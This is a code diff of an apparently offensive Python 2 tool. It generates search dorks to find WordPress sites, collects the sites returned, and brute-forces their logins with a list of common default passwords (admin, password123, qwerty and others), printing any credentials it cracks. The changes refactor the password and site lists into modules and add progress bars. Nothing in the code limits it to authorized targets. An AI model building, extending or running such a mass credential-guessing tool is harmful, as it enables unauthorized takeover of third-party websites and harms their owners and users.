@@ -20,11 +20,6 @@ import dorkMaker
 import dorkScanner
 import bruteForce
 
-dorks        = []
-sites        = []
-default_pwds = ["admin", "demo", "demo123", "password", "password123", "qwerty", "qwerty123",
-				"administrator", "root", "pass", "pass123", "123456789"]
-
 def logo():
 	logo = """
  __      ______________________                __          
@@ -72,68 +67,91 @@ def main():
 
 		elif wpb == "show passwords":
 			print "-"*60
-			for pwd in default_pwds:
+			for pwd in bruteForce.passwords:
 				print "  "+pwd
 			print "-"*60
-			print "[*] There are %s password!"%(len(default_pwds))
+			print "[*] There are %s password!"%(len(bruteForce.passwords))
 
 		elif "generate dork" in wpb:
-			num   = wpb.split()[-1]
-			dorks = dorkMaker.generateDork(num)
-			print "[*] Generated %s dork!"%(len(dorks))
+			try:
+				num = int(wpb.split()[-1])
+			except ValueError:
+				print "[-] Example Usage: generate dork 5"
+				main()
+
+			dorkMaker.dorks = [] # ^^
+			dorkMaker.generateDork(num)
+			print "[*] Generated %s dork!"%(len(dorkMaker.dorks))
 
 		elif wpb == "show dorks":
-			if len(dorks) != 0:
+			if len(dorkMaker.dorks) != 0:
 				print "-"*60
-				for dork in dorks:
+				for dork in dorkMaker.dorks:
 					print "  "+dork
 				print "-"*60
-				print "[*] There are %s dork!"%(len(dorks))
+				print "[*] There are %s dork!"%(len(dorkMaker.dorks))
 			
 			else:
 				print "[-] No dorks to show!"
 
 
 		elif "scan dorks" in wpb:
-			num = wpb.split()[-1]
-			if len(dorks) != 0:
-				print "\n[*] Scan started!"
-				for dork in dorks:
-					dorkScanner.getSites(dork, num)
+			try:
+				num = int(wpb.split()[-1])
+			except ValueError:
+				print "[-] Example Usage: scan dorks 5"
+				main()
 
-				sites = dorkScanner.sites
-				print "\n[+] Found %s site!"%(len(sites))
+			if len(dorkMaker.dorks) != 0:
+				dorkScanner.sites = [] #^^
+				print "\n[*] Scan started!"
+				forBar = 0
+				barLen = 50.0
+				for dork in dorkMaker.dorks:
+					sys.stdout.write("\r[%s%s | %d%%]"%('='*int(forBar), " "*int(barLen - forBar), int(forBar * 2)))
+					sys.stdout.flush()
+					dorkScanner.getSites(dork, num)
+					forBar += barLen / len(dorkMaker.dorks)
+				print "\r[%s | 100%%]"%("="*50)
+				
+				print "\n[+] Found %s site!"%(len(dorkScanner.sites))
+
+			else:
+				print "[-] No dorks to scan!"
 
 		elif wpb == "show sites":
-			if len(sites) != 0:
+			if len(dorkScanner.sites) != 0:
 				print "-"*60
-				for site in sites:
+				for site in dorkScanner.sites:
 					print "  "+site
 				print "-"*60
-				print "[*] There are %s site!"%(len(sites))
+				print "[*] There are %s site!"%(len(dorkScanner.sites))
 
 			else:
 				print "[-] No sites to show!"
 
 		elif wpb == "start":
-			if len(sites) != 0:
-				for site in sites:
-					site = "http://" + site.split("/")[2] + "/wp-login.php" # re formatting url for test :)
-					print "[-] Trying: ", site
-					for pwd in default_pwds:
-						bruteForce.brute(site, pwd)
+			if len(dorkScanner.sites) != 0:
+				forBar           = 0
+				barLen           = 50.0
+				bruteForce.found = []
+				print "[+] Brute force attack started!"
+				print "[+] Check %s for found sites!\n"%(os.getcwdu()+os.sep+"found.txt")
+				for site in dorkScanner.sites:
+					sys.stdout.write("\r[%s%s | %d%% | Found Sites: %s]"%('='*int(forBar), " "*int(barLen - forBar), int(forBar * 2), len(bruteForce.found)))
+					sys.stdout.flush()
+					bruteForce.brute(site)
+					forBar += barLen / len(dorkScanner.sites)
+				print "\r[%s | 100%% | Found sites: %s]"%("="*50, len(bruteForce.found))
 
 				found = bruteForce.found
 				if len(found) != 0:
-					print "-"*60
 					for f in found:
-						print "-"*60
-						print "[+] Site: %s"%(f[0])
+						print "\n[+] Site: %s"%(f[0])
 						print "    [+] Username: %s"%(f[1])
 						print "    [+] Password: %s"%(f[2])
 				else:
-					print "-"*60
-					print "[-_-] I could not find anything."
+					print "\n[-_-] I could not find anything."
 
 			else:
 				print "[-] No sites to brute!"
